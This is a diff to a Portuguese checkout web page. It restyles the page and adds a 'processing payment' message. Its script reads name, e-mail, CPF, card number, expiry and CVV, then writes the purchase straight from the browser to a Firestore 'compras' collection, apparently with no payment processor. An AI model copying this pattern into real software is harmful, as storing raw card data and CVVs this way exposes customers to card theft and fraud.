@@ -9,7 +9,7 @@
     body {
       margin: 0;
       font-family: 'Poppins', sans-serif;
-      background: #f9f9f9;
+      background: linear-gradient(to right, #e0f7fa, #fff);
     }
     .container {
       max-width: 500px;
@@ -17,13 +17,13 @@
       background: white;
       padding: 30px;
       border-radius: 15px;
-      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+      box-shadow: 0 5px 25px rgba(0,0,0,0.1);
     }
     h1 {
-      font-size: 24px;
+      font-size: 26px;
       text-align: center;
-      color: #333;
-      margin-bottom: 20px;
+      color: #007bff;
+      margin-bottom: 25px;
     }
     input, button {
       width: 100%;
@@ -48,13 +48,21 @@
     .hidden {
       display: none;
     }
-    .success {
-      background: #d4edda;
-      color: #155724;
+    .success, .processing {
       padding: 10px;
       border-radius: 5px;
       margin-top: 20px;
+      font-weight: bold;
+      text-align: center;
       display: none;
+    }
+    .success {
+      background: #d4edda;
+      color: #155724;
+    }
+    .processing {
+      background: #fff3cd;
+      color: #856404;
     }
   </style>
 </head>
@@ -79,8 +87,12 @@
       <button onclick="finalizarCompra()">💳 Comprar agora</button>
     </div>
 
-    <div id="mensagem" class="success">
-      ✅ Compra registrada com sucesso! Verifique seu email.
+    <div id="mensagemProcessando" class="processing">
+      ⏳ Estamos processando seu pagamento. Aguarde...
+    </div>
+
+    <div id="mensagemSucesso" class="success">
+      ✅ Compra registrada com sucesso! Verifique seu e-mail.
     </div>
   </div>
 
@@ -105,12 +117,11 @@
       const nome = document.getElementById('nome').value.trim();
       const email = document.getElementById('email').value.trim();
 
-      if (nome === "" || email === "") {
+      if (!nome || !email) {
         alert("Preencha nome e e-mail para continuar.");
         return;
       }
 
-      // Guarda os dados temporariamente
       localStorage.setItem("temp_nome", nome);
       localStorage.setItem("temp_email", email);
 
@@ -123,7 +134,6 @@
       const cartao = document.getElementById('cartao').value;
       const validade = document.getElementById('validade').value;
       const cvv = document.getElementById('cvv').value;
-
       const nome = localStorage.getItem("temp_nome");
       const email = localStorage.getItem("temp_email");
 
@@ -131,6 +141,10 @@
         alert("Preencha todos os campos de pagamento.");
         return;
       }
+
+      // Mostra mensagem de carregamento
+      document.getElementById('mensagemProcessando').style.display = 'block';
+      document.getElementById('mensagemSucesso').style.display = 'none';
 
       db.collection("compras").add({
         nome: nome,
@@ -144,12 +158,21 @@
         data: new Date().toISOString()
       })
       .then(() => {
-        document.getElementById('mensagem').style.display = 'block';
-        document.getElementById('step2').reset?.();
+        document.getElementById('mensagemProcessando').style.display = 'none';
+        document.getElementById('mensagemSucesso').style.display = 'block';
+        clearInputs();
       })
       .catch((error) => {
         alert("Erro ao registrar a compra: " + error);
+        document.getElementById('mensagemProcessando').style.display = 'none';
       });
+    }
+
+    function clearInputs() {
+      document.getElementById('cpf').value = '';
+      document.getElementById('cartao').value = '';
+      document.getElementById('validade').value = '';
+      document.getElementById('cvv').value = '';
     }
   </script>
 </body>
